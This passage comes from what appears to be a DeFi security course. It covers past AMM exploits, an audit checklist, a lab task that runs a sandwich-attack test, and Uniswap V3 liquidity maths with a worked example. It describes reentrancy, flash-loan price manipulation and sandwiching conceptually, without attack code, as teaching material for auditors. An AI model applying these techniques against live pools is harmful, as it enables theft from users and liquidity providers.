  • Lendf.me / Uniswap V1, April 2020 (~$25M): ERC-777 tokens have transfer hooks that call the sender, which enabled reentrancy into a lending protocol that updated state after the transfer. AMMs and lenders must treat tokens as untrusted code.
  • Harvest Finance, October 2020 (~$24M): flash loans moved a Curve pool's price, and the vault valued its assets at that spot price. Same pattern as Bug 4 in M1; you will see Curve in a later lab.
  • Read the Uniswap V2 whitepaper (short) and the public V2 audit, then write one paragraph: which attacks are structurally impossible, and which are left to integrators (oracles, slippage)?

Step 7. AMM audit checklist

  • Invariant checked on final balances, with fee, rounding in the pool's favour.
  • LP mint/burn: first-deposit lock, proportional maths, rounding down on mint, down on burn payout.
  • Token quirks: fee-on-transfer, rebasing, ERC-777 hooks, tokens that return no bool, extreme decimals.
  • Callbacks and flash swaps: reentrancy lock, final-state checks, view functions that can be read mid-call.
  • Oracle exposure: do any integrators use the spot ratio? Is a TWAP window long enough for this pool's depth?
  • Router: slippage, deadline, path validation, recipient, approvals, unwrapping.
  • Admin: fee switch, factory, pause; what an owner can change on existing pools.
Lab 9 deliverable(1) By hand, compute the output and the new price for swapping 25 ETH into a pool of 400 ETH and 800,000 USDC; check with the calculator. (2) Run the sandwich test and write a finding in the Lab 1 format: victim loses X, attacker gains Y, root cause is missing slippage control.

Lab 10. Uniswap V3

In plain wordsV3 lets liquidity providers choose a price range so their money works harder. The pool becomes many small constant-product pieces joined at ticks, and the maths uses a special fixed-point number format.

Key terms: tick, range, sqrt price. See the glossary at the end.

V2 spreads each LP's money across every price from 0 to ∞. V3 lets an LP pick a price range and concentrate all their capital there. That makes trading far more capital-efficient, but turns the pool from one curve into many stitched-together ranges. New objects to learn: ticks, √price in Q64.96 fixed point, liquidity that changes as price crosses ticks, and fee growth counters.

Step 1. The maths

Price             P = token1 / token0 (raw units)
Tick i            P(i) = 1.0001^i       (1 tick = 0.01%)
Stored price      sqrtPriceX96 = √P · 2^96      (a uint160)
Liquidity         L = √(x · y) for the virtual reserves of the active range

Inside range [pa, pb], current price p:
  x (token0) = L · (1/√p − 1/√pb)
  y (token1) = L · (√p − √pa)
Moving price from p to p':
  Δy = L · (√p' − √p)           (token1 in)
  Δx = L · (1/√p − 1/√p')       (token0 out)
Capital efficiency vs full range   1 / (1 − (pa/pb)^¼)

Worked position. ETH/USDC, price 2,000, range 1,800 to 2,200. √2000 = 44.721, √1800 = 42.426, √2200 = 46.904.

  • LP provides 1 ETH: L = 1 / (1/44.721 − 1/46.904) = 1 / 0.0010406 = 960.99.
  • USDC needed: 960.99 · (44.721 − 42.426) = 2,205. Total ≈ $4,205.
  • Efficiency: (1800/2200)^¼ = 0.951, so 1 / (1 − 0.951) = ≈ 20× a V2 position of the same size.
  • A trader buys ETH, pushing price to 2,100: ETH out = 960.99 · (1/44.721 − 1/45.826) = 0.518; USDC in = 960.99 · (45.826 − 44.721) = 1,061; average price 2,049.
  • If price rises above 2,200 the position is 100% USDC and earns no fees. Below 1,800 it is 100% ETH.

Fees. Pool keeps feeGrowthGlobal += fee · 2^128 / L. A position's fees = L · (feeGrowthInside − feeGrowthInsideLast) / 2^128. Each tick stores feeGrowthOutside so the pool can compute "inside" as global minus below minus above. These subtractions deliberately underflow: V3 was written in Solidity 0.7, where wrapping is the default. Port it to 0.8 without unchecked and positions can become impossible to touch.
